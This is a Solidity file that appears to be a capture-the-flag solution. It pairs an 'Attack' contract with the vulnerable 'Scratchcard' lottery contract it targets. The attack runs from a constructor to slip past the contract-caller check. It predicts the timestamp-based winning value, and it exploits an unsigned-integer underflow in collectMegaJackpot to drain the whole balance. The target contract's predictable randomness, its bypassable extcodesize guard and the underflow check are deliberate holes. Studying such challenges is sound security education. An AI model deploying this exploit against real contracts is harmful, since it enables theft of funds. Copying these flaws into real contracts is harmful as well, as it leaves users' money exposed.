pragma solidity 0.4.24;
// Attacker Address 0x43065950E0185BD74361D8580Daaa5BFF806aaDE
// Scratchcard Address 0x505d51adcccb62cd33579c1ea7b94a717f7ae06e
contract Attack {
    address public owner;
    address public target;

    constructor(address t) public payable {
        require(msg.value >= 10 * 10**18, "not enough to play 25 times");
        owner = msg.sender;
        target = t;
        uint256 val = (now % 10**8) * 10**10;
        for (int256 i = 0; i < 25; i++) {
            I3(target).play.value(val)();
        }
        I3(target).collectMegaJackpot(address(target).balance);
    }

    function withdraw() external {
        owner.transfer(address(this).balance);
    }
}

interface I3 {
    function play() external payable;
    function collectMegaJackpot(uint256 _amount) external;
}


library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;

    }
}

contract Scratchcard{

    event CardPurchased(address indexed player, uint256 cost, bool winner);

    mapping(address=>uint256) private winCount;
    uint256 private cost;


    using Address for address;

    constructor(address _ctfLauncher, address _player) public payable
        
    {
    }

    modifier notContract(){
        require(!msg.sender.isContract(), "Contracts Not Allowed");
        _;
    }
    
    function play() public payable notContract{
        bool won = false;
        if((now%10**8)*10**10 == msg.value){
            won = true;
            winCount[msg.sender] += 1;
            cost = msg.value;
            msg.sender.transfer(cost);
        }
        else{
            cost = 0;
            winCount[msg.sender] = 0;
        }
        emit CardPurchased(msg.sender, msg.value, won);
    }    

    function checkIfMegaJackpotWinner() public view returns(bool){
        return(winCount[msg.sender]>=25);
    }

    function collectMegaJackpot(uint256 _amount) public notContract{
        require(checkIfMegaJackpotWinner(), "User Not Winner");
        require(2 * cost - _amount > 0, "Winners May Only Withdraw Up To 2x Their Scratchcard Cost");
        winCount[msg.sender] = 0;
        msg.sender.transfer(_amount);
    }

    function () public payable{
        play();
    }

}
